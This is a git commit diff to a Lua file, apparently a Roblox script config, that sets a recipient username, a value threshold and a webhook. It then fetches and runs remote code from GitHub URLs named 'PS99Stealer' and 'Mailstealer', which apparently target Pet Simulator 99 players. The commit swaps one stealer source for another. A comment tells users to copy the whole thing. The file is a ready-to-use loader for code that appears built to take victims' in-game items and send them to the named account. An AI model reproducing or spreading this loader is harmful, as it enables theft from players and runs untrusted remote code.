45b7b6873f61b3235216fb43a3c0e4375a865103
Salesman <samyberri7@gmail.com>
2025-03-22 13:21:13 +0100

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,6 +1,6 @@
 Username = "Samyb79"
 Username2 = "Samyb79"
-MinimumRAP = 1
-Webhook = "."
+MinimumRAP = 1000000
+Webhook = ""
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))() -- copy the whole thing, even the username =
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Salesman10/Pet-Simulator-99-/refs/heads/main/Mailstealer", true))() -- copy the whole thing, even the username =
